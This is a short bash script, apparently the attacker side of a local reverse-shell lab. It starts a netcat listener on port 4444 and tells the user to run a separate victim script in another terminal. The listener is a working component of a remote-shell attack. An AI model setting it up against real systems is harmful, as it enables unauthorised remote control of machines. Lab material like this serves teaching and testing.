#!/usr/bin/env bash
# Attacker node: listen for the reverse shell.
echo "[*] Listening on 0.0.0.0:4444 — run 'bash victim.sh' in another terminal."
exec nc -lvnp 4444
